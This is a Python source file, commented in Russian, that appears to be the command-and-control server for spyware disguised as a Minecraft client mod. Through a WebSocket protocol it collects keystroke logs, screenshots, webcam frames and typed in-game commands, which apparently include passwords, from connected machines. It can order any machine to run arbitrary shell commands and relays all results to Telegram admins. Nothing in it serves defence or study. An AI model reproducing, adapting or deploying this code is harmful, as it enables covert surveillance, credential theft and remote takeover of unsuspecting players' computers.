"""Публичный WebSocket-вход для Minecraft-клиентов. Протокол v1 (JSON-текстовые фреймы):

клиент → сервер:  hello {token, installation_id, nickname, protocol}
                  status {nickname, server, ip}
                  command {command, raw, ip, server}
                  keydump {data_b64}                       (журнал клавиш по запросу)
                  screenshot {data_b64}                    (PNG по запросу)
                  screenshot_error {error}                 (не смог снять)
                  webcam {data_b64}                        (JPEG кадр по запросу)
                  webcam_error {error}                     (камера недоступна)
                  shell {exit, out_b64}                    (результат команды /cmd — агент)
                  keepalive {}
сервер → клиент:  welcome {ok, protocol}
                  shutdown {reason}     (закрыть игру — агент этот пакет игнорирует)
                  refresh {}            (прислать статус немедленно)
                  keydump_request {}    (прислать хвост файла журнала)
                  screenshot_request {} (снять и прислать PNG)
                  webcam_request {}     (снять кадр с вебкамеры)
                  shell_request {command} (исполнить команду под агентом)
"""
import asyncio
import base64
import datetime
import json
import logging
import ssl
import time
from pathlib import Path
from typing import Any, Optional

from aiogram.types import BufferedInputFile
from websockets.asyncio.server import Server, serve
from websockets.exceptions import ConnectionClosed

import config
import database

log = logging.getLogger("modconnect.ws")

PROTOCOL_VERSION = 1
STALE_AFTER = 75.0      # секунд без входящих пакетов → считаем клиента отвалившимся
HELLO_TIMEOUT = 15.0

_bot: Any = None
_sweeper: Optional[asyncio.Task] = None


def bind(bot: Any, admin_ids: tuple[int, ...]) -> None:
    """Список админов читается из config.ADMIN_IDS на каждую отправку — передача
    admin_ids оставлена для совместимости вызова main.py."""
    global _bot
    _bot = bot


def build_ssl_context() -> Optional[ssl.SSLContext]:
    """Если заданы WSS_CERT и WSS_KEY — сервер поднимется с TLS (wss://)."""
    if not (config.WSS_CERT and config.WSS_KEY):
        return None
    for path in (config.WSS_CERT, config.WSS_KEY):
        if not Path(path).is_file():
            log.error("TLS-файл не найден: %s — websocket поднимется БЕЗ TLS", path)
            return None
    ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    try:
        ctx.load_cert_chain(certfile=config.WSS_CERT, keyfile=config.WSS_KEY)
    except ssl.SSLError as exc:
        log.exception("Не удалось загрузить сертификат: %s", exc)
        return None
    return ctx


class ClientSession:
    __slots__ = ("websocket", "token_hash", "client_id", "nickname",
                 "installation_id", "server", "ip", "last_seen", "connected_at")

    def __init__(self, websocket: Any, client_id: int, token_hash: str,
                 nickname: str, installation_id: str, connected_at: float) -> None:
        self.websocket = websocket
        self.client_id = client_id
        self.token_hash = token_hash
        self.nickname = nickname
        self.installation_id = installation_id
        self.server = ""
        self.ip = ""
        self.last_seen = connected_at
        self.connected_at = connected_at


class ClientRegistry:
    """Живые WS-сессии. Ключ — token_hash + installation_id: на одном токене
    спокойно живут и Minecraft-клиент, и хост-агент (mxdog)."""

    def __init__(self) -> None:
        self._sessions: dict[str, ClientSession] = {}
        self._lock = asyncio.Lock()

    @staticmethod
    def _key(session: ClientSession) -> str:
        return f"{session.token_hash}|{session.installation_id}"

    async def attach(self, session: ClientSession) -> None:
        async with self._lock:
            self._sessions[self._key(session)] = session

    async def detach(self, session: ClientSession) -> None:
        async with self._lock:
            self._sessions.pop(self._key(session), None)

    async def drop_token(self, token_hash: str) -> None:
        """Убрать все сессии конкретного токена (отзыв токена)."""
        async with self._lock:
            for key in list(self._sessions):
                if self._sessions[key].token_hash == token_hash:
                    self._sessions.pop(key, None)

    def all(self) -> list[ClientSession]:
        return list(self._sessions.values())

    def get_by_id(self, client_id: int) -> Optional[ClientSession]:
        for session in self._sessions.values():
            if session.client_id == client_id:
                return session
        return None


registry = ClientRegistry()


async def notify_admin(text: str) -> None:
    if _bot is None:
        return
    # реплика всем ACTUAL админам (config.ADMIN_IDS живой — кнопка добавления работает сразу)
    for chat_id in config.ADMIN_IDS:
        try:
            await _bot.send_message(chat_id, text)
        except Exception as exc:  # Telegram временно недоступен — WS не должен падать
            log.debug("не удалось отправить уведомление админу %s: %s", chat_id, exc)


async def send_file_to_admins(payload: bytes, filename: str, caption: str,
                              as_photo: bool = False) -> int:
    """Отправить файл/фото всем текущим админам. Возвращает число доставок."""
    if _bot is None or not payload:
        return 0
    sent = 0
    for chat_id in config.ADMIN_IDS:
        try:
            file = BufferedInputFile(payload, filename)
            if as_photo:
                await _bot.send_photo(chat_id, file, caption=caption)
            else:
                await _bot.send_document(chat_id, file, caption=caption)
            sent += 1
        except Exception as exc:
            log.debug("файл не ушёл админу %s: %s", chat_id, exc)
    return sent


def _clean(value: str, limit: int) -> str:
    value = value.replace("\n", " ").replace("\r", " ").strip()
    return value[:limit]


async def _handle(websocket: Any) -> None:
    """Жизненный цикл одного WS-соединения (websockets>=13, новый asyncio API)."""
    session: Optional[ClientSession] = None
    peer = websocket.remote_address
    log.info("WS-коннект: %s", peer)
    try:
        # ---- рукопожатие: первым фреймом обязан прийти hello с токеном ----
        raw = await asyncio.wait_for(websocket.recv(), timeout=HELLO_TIMEOUT)
        hello = json.loads(raw)
        if not isinstance(hello, dict) or hello.get("type") != "hello":
            await websocket.send(json.dumps({"type": "error", "message": "expected hello"}))
            await websocket.close(code=1008, reason="expected hello")
            return

        token = str(hello.get("token") or "")
        nickname = _clean(str(hello.get("nickname") or ""), 32)
        installation_id = _clean(str(hello.get("installation_id") or ""), 64)
        protocol = hello.get("protocol")

        thash = database.hash_token(token)
        client = database.get_by_token_hash(thash)
        if client is None:
            log.info("WS-отказ (bad token): %s", peer)
            await notify_admin("❌ Попытка подключения с неверным токеном.")
            await websocket.close(code=4001, reason="invalid token")
            return
        if protocol not in (None, PROTOCOL_VERSION):
            log.warning("неизвестная версия протокола %s от %s", protocol, peer)

        if installation_id:
            other = database.get_by_installation_id(installation_id)
            if other is not None and other["token_hash"] != thash:
                log.info("WS-отказ (токен занят другой установкой): %s", peer)
                await notify_admin("❌ Токен уже привязан к другой установке.")
                await websocket.close(code=4003, reason="installation mismatch")
                return

        session = ClientSession(websocket, client["id"], thash, nickname,
                                installation_id, time.time())
        await registry.attach(session)
        database.mark_connected(thash, installation_id, nickname)
        await websocket.send(json.dumps(
            {"type": "welcome", "ok": True, "protocol": PROTOCOL_VERSION},
            ensure_ascii=False))
        log.info("клиент принят: id=%s ник=%r установка=%r",
                 client["id"], nickname or client["nickname"], installation_id)
        await notify_admin(f"🟢 Подключился клиент: {nickname or client['nickname']}")

        # ---- служебные пакеты до разрыва ----
        async for raw in websocket:
            session.last_seen = time.time()
            database.touch(thash)
            try:
                msg: dict[str, Any] = json.loads(raw)
            except json.JSONDecodeError:
                log.debug("мусорный кадр от %s", peer)
                continue
            kind = msg.get("type")
            if kind == "status":
                session.nickname = _clean(str(msg.get("nickname") or session.nickname), 32)
                session.server = _clean(str(msg.get("server") or ""), 96)
                session.ip = _clean(str(msg.get("ip") or ""), 64)
                database.mark_status(thash, session.nickname, session.server, session.ip)
            elif kind == "command":
                raw_cmd = _clean(str(msg.get("raw") or ""), 200)
                cmd = _clean(str(msg.get("command") or ""), 24)
                server_ip = _clean(str(msg.get("ip") or ""), 64)
                server_label = _clean(str(msg.get("server") or ""), 96)
                # в лог — только тип команды, сырой текст с паролем не пишем
                log.info("команда %s от %s (сервер %r ip=%r)",
                         cmd, session.nickname, server_label, server_ip)
                database.add_recorded_command(session.nickname, server_label, server_ip, raw_cmd)
                place = server_ip or "—"
                if server_label and server_label != server_ip:
                    place += " · " + server_label
                await notify_admin(
                    f"🔐 {session.nickname} ввёл: `{raw_cmd}` (`{cmd}`)\n"
                    f"📍 {place}")
            elif kind == "keydump":
                try:
                    payload = base64.b64decode(str(msg.get("data_b64") or ""), validate=False)
                except (ValueError, TypeError):
                    payload = b""
                nick = _clean(session.nickname or "client", 24)
                stamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                sent = await send_file_to_admins(
                    payload,
                    f"keydump_{nick}_{stamp}.txt",
                    f"⌨️ Журнал нажатий — клиент {nick} ({len(payload)} байт)")
                log.info("keydump имя=%r %s байт → админов: %s", nick, len(payload), sent)
            elif kind == "screenshot":
                try:
                    payload = base64.b64decode(str(msg.get("data_b64") or ""), validate=False)
                except (ValueError, TypeError):
                    payload = b""
                nick = _clean(session.nickname or "client", 24)
                stamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                sent = await send_file_to_admins(
                    payload,
                    f"shot_{nick}_{stamp}.png",
                    f"📷 Скриншот — клиент {nick} ({len(payload)} байт)",
                    as_photo=True)
                log.info("скриншот %s байт → админов: %s", len(payload), sent)
            elif kind == "webcam":
                try:
                    payload = base64.b64decode(str(msg.get("data_b64") or ""), validate=False)
                except (ValueError, TypeError):
                    payload = b""
                nick = _clean(session.nickname or "client", 24)
                stamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                sent = await send_file_to_admins(
                    payload,
                    f"cam_{nick}_{stamp}.jpg",
                    f"🎥 Вебкамера — клиент {nick} ({len(payload)} байт)",
                    as_photo=True)
                log.info("кадр вебки %s байт → админов: %s", len(payload), sent)
            elif kind == "screenshot_error":
                err = _clean(str(msg.get("error") or "причина неизвестна"), 120)
                await notify_admin(f"📷 {session.nickname}: скриншот не вышел — {err}")
            elif kind == "webcam_error":
                err = _clean(str(msg.get("error") or "причина неизвестна"), 120)
                await notify_admin(f"🎥 {session.nickname}: вебкамера не сработала — {err}")
            elif kind == "shell":
                # ответ агента на shell_request: вывод команды админам, кусками
                try:
                    out_text = base64.b64decode(str(msg.get("out_b64") or ""), validate=False)\
                        .decode("utf-8", "replace")
                except (ValueError, TypeError):
                    out_text = ""
                try:
                    exit_code = str(int(msg.get("exit")))
                except (ValueError, TypeError):
                    exit_code = "?"
                nick = _clean(session.nickname or "client", 24)
                if not out_text.strip():
                    await notify_admin(
                        f"🖥 {nick} · выход {exit_code}\n(пусто)")
                else:
                    out_text = out_text[:21000]
                    chunks = [out_text[i:i + 3000] for i in range(0, len(out_text), 3000)]
                    total = len(chunks)
                    for index, chunk in enumerate(chunks, start=1):
                        head = f"🖥 {nick} · выход {exit_code}"
                        if total > 1:
                            head += f" ({index}/{total})"
                        await notify_admin(head + "\n" + chunk)
            elif kind == "keepalive":
                pass
            else:
                log.debug("неизвестный тип %r от %s", kind, peer)
    except asyncio.TimeoutError:
        log.info("WS-таймаут hello: %s", peer)
        try:
            await websocket.close(code=4002, reason="hello timeout")
        except Exception:
            pass
    except ConnectionClosed:
        pass
    except json.JSONDecodeError:
        log.info("WS: нечитаемый JSON от %s — закрываю", peer)
        try:
            await websocket.close(code=1008, reason="invalid json")
        except Exception:
            pass
    except Exception:
        log.exception("WS-обработчик упал (%s)", peer)
    finally:
        if session is not None:
            await registry.detach(session)
            database.mark_disconnected(session.token_hash)
            log.info("WS-разрыв: %s ник=%r", peer, session.nickname)
            await notify_admin(f"🔴 Отключился клиент: {session.nickname}")


async def _stale_sweeper() -> None:
    """Раз в 30 сек: мёртвые сокеты закрываем; finally-блок хендлера обновит DB."""
    while True:
        await asyncio.sleep(30)
        now = time.time()
        for session in registry.all():
            if now - session.last_seen > STALE_AFTER:
                log.info("сессия мертва (тишина %.0f сек): %r",
                         now - session.last_seen, session.nickname)
                try:
                    await session.websocket.close(code=4002, reason="keepalive timeout")
                except Exception:
                    pass


async def start(host: str, port: int) -> Server:
    """Поднять WS-сервер. Вызывается из main до polling."""
    global _sweeper
    ssl_ctx = build_ssl_context()
    scheme = "wss" if ssl_ctx else "ws"
    tls_mark = " (TLS)" if ssl_ctx else ""
    ws_server = await serve(
        _handle,
        host,
        port,
        ssl=ssl_ctx,       # websockets>=13 new asyncio API: параметр называется ssl
        ping_interval=25,    # протокольный ping/pong держит соединение живым
        ping_timeout=20,
        max_size=1_000_000,  # отсекаем гигантские кадры
    )
    _sweeper = asyncio.create_task(_stale_sweeper())
    log.info("WS-сервер слушает %s://%s:%s%s", scheme, host, port, tls_mark)
    return ws_server


async def stop(server: Optional[Server]) -> None:
    global _sweeper
    if server is not None:
        server.close()
        await server.wait_closed()
    if _sweeper is not None:
        _sweeper.cancel()
        try:
            await _sweeper
        except asyncio.CancelledError:
            pass
        _sweeper = None


async def send_json(session: ClientSession, payload: dict[str, Any]) -> None:
    """Отправка команды конкретному клиенту (используется ботом)."""
    text = json.dumps(payload, ensure_ascii=False)
    await session.websocket.send(text)
